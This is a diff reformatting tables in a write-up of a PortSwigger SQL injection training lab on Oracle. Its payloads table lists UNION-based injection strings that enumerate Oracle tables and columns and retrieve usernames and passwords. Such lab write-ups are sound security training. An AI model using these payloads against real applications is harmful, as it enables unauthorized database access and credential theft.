@@ -1,11 +1,11 @@
 # SQL injection attack, listing the database contents on Oracle
 
-| Field | Value |
-|---|---|
-| **Difficulty** | Practitioner |
-| **Category** | SQL Injection (Examining the database) |
-| **Status** | Solved |
-| **Lab URL** | `https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle` |
+| Field          | Value                                                                                                            |
+| -------------- | ---------------------------------------------------------------------------------------------------------------- |
+| **Difficulty** | Practitioner                                                                                                     |
+| **Category**   | SQL Injection (Examining the database)                                                                           |
+| **Status**     | Solved                                                                                                           |
+| **Lab URL**    | `https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle` |
 
 ---
 
@@ -165,9 +165,9 @@ Using the `administrator` credentials retrieved in step 7, I authenticated to th
 
 MySQL/Microsoft store schema metadata in the `information_schema` schema (`.tables` and `.columns`). Oracle exposes the same information through its **data dictionary**, a set of read-only views:
 
-| MySQL / SQL Server | Oracle |
-|---|---|
-| `information_schema.tables` | `all_tables` |
+| MySQL / SQL Server           | Oracle            |
+| ---------------------------- | ----------------- |
+| `information_schema.tables`  | `all_tables`      |
 | `information_schema.columns` | `all_tab_columns` |
 
 - **`dual`** — a built-in dummy table used when a `SELECT` has no real table to read from (Oracle forces a `FROM` by grammatically)
@@ -178,13 +178,13 @@ MySQL/Microsoft store schema metadata in the `information_schema` schema (`.tabl
 
 ## Payloads
 
-| Step | Payload |
-|---|---|
-| Column count | `'+ORDER+BY+3--` |
-| Oracle syntax check | `'+UNION+SELECT+'abc','def'+FROM+dual--` |
-| Enumerate tables | `'+UNION+SELECT+table_name,NULL+FROM+all_tables--` |
-| Enumerate columns | `'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_IEFSNT'--` |
-| Retrieve credentials | `'+UNION+SELECT+USERNAME_XIAMFQ,+PASSWORD_FLBZYF+FROM+USERS_IEFSNT--` |
+| Step                 | Payload                                                                                  |
+| -------------------- | ---------------------------------------------------------------------------------------- |
+| Column count         | `'+ORDER+BY+3--`                                                                         |
+| Oracle syntax check  | `'+UNION+SELECT+'abc','def'+FROM+dual--`                                                 |
+| Enumerate tables     | `'+UNION+SELECT+table_name,NULL+FROM+all_tables--`                                       |
+| Enumerate columns    | `'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_IEFSNT'--` |
+| Retrieve credentials | `'+UNION+SELECT+USERNAME_XIAMFQ,+PASSWORD_FLBZYF+FROM+USERS_IEFSNT--`                    |
 
 ---
 
@@ -253,6 +253,6 @@ Full database disclosure: schema, table and column names, and arbitrary credenti
 - [PortSwigger: SQL injection](https://portswigger.net/web-security/sql-injection)
 - [PortSwigger: SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 - [PortSwigger: Examining the database](https://portswigger.net/web-security/sql-injection/examining-the-database)
-- [Oracle: data dictionary views](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/dictionary.html)
+- [Oracle: data dictionary views](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/about-static-data-dictionary-views.html)
 - [DB Fiddle / Oracle: the DUAL table](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/SELECT.html)
 - [OWASP: active SQL injection prevention cheat sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
